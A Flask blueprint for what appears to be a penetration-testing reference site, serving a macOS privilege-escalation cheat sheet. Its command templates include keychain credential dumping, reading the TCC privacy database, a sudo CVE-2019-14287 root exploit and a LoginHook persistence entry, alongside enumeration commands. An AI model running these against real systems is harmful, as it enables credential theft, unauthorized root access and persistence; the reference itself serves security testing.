from flask import Blueprint, render_template

bp = Blueprint("privesc_mac", __name__)

CARDS = [
    {"title": "Automated", "blocks": [
        {"tpl": "./linpeas.sh"},
        {"tpl": "./macpeas.sh"},
    ]},
    {"title": "Manual enumeration", "blocks": [
        {"tpl": "id"},
        {"tpl": "sudo -l"},
        {"tpl": "sw_vers"},
        {"tpl": "find / -perm -4000 -type f 2>/dev/null"},
        {"tpl": "launchctl list"},
        {"tpl": "ls -la /Library/LaunchDaemons /Library/LaunchAgents"},
    ]},
    {"title": "Keychain & TCC", "blocks": [
        {"tpl": "security dump-keychain -d login.keychain"},
        {"tpl": "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db 'select * from access'"},
    ]},
    {"title": "Persistence / vectors", "blocks": [
        {"tpl": "sudo -u#-1 /bin/bash", "lbl": "sudo CVE-2019-14287 (if vulnerable)"},
        {"tpl": "defaults write com.apple.loginwindow LoginHook /tmp/x.sh"},
    ]},
]


@bp.route("/privesc/mac")
def index():
    return render_template("cheat.html", active="privesc_mac",
                           title="macOS privilege escalation", tag="privesc",
                           intro="Enumeration, keychain/TCC, and persistence paths.",
                           cards=CARDS)


MODULE = {"id": "privesc_mac", "title": "Mac", "category": "Privilege Escalation",
          "order": 2, "blueprint": bp, "endpoint": "privesc_mac.index"}
